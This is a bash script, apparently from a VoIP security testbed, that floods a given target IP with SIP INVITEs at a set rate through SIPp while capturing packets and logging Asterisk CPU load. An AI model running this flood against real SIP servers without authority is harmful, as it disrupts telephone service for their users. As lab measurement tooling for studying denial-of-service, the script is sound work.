#!/bin/bash
# run_flood_sipp.sh
# Uso: ./run_flood_sipp.sh <target-ip> <rate> <duration>
set -euo pipefail
TARGET="$1"
RATE="${2:-500}"     # invites por segundo
DURATION="${3:-60}"  # segundos
TIMESTAMP=$(date +%F_%H%M%S)
BASE="../flood_sip"
RUN_DIR="${BASE}/runs/${TIMESTAMP}"
mkdir -p "${RUN_DIR}"

# metadata
cat > "${RUN_DIR}/metadata.json" <<JSON
{
  "attack": "flood_sip",
  "target": "${TARGET}",
  "rate": ${RATE},
  "duration_s": ${DURATION},
  "timestamp": "${TIMESTAMP}",
  "sipp_cmd": "sipp -sf ${BASE}/params/flood.xml -r ${RATE} -m 0 ${TARGET}:5060"
}
JSON

# tcpdump
sudo tcpdump -i any host "${TARGET}" -w "${BASE}/pcaps/${TIMESTAMP}.pcap" &
TCPDUMP_PID=$!

# monitor CPU
python3 ../../modules/monitorar_ataque_sip.py --pid $(pidof asterisk) --out "${BASE}/logs/${TIMESTAMP}_cpu.csv" &
MON_PID=$!

# run SIPp (ajuste -sf conforme seu XML)
sipp -sf "${BASE}/params/flood.xml" -r ${RATE} ${TARGET}:5060 > "${BASE}/raw/${TIMESTAMP}_sipp.out" 2> "${BASE}/raw/${TIMESTAMP}_sipp.err" & SIPP_PID=$!

# aguarda duração
sleep ${DURATION}

# finaliza
kill ${SIPP_PID} || true
kill ${MON_PID} || true
sudo kill ${TCPDUMP_PID} || true

# move artefatos para run dir
cp "${BASE}/raw/${TIMESTAMP}_sipp.out" "${RUN_DIR}/" || true
cp "${BASE}/raw/${TIMESTAMP}_sipp.err" "${RUN_DIR}/" || true
cp "${BASE}/pcaps/${TIMESTAMP}.pcap" "${RUN_DIR}/" || true
cp "${BASE}/logs/${TIMESTAMP}_cpu.csv" "${RUN_DIR}/" || true

echo "Flood run salvo em ${RUN_DIR}"
